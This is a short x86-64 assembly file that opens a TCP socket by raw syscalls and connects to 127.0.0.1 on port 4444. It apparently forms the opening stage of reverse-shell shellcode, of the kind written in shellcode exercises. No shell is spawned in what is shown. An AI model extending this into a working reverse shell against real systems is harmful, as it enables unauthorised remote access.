BITS 64

global _start

section .bss
    struc sockaddr
        sin_family: resw 1
        sin_port: resw 1
        sin_addr: resd 1
    endstruc

section .data
    sockaddr_struct_init:
        istruc sockaddr
            at sin_family, dw 0x2
            at sin_port, dw 0x5c11
            at sin_addr, dd 0x100007f
        iend

section .text

_start:
    mov rax, 41
    mov rdi, 0x2
    mov rsi, 0x1
    mov rdx, 0x6
    syscall
    push rax
    jmp _connect_to_socket

_connect_to_socket:
    mov rax, 42
    pop rdi
    push rdi
    mov rsi, sockaddr_struct_init
    mov rdx, 0x10
    syscall
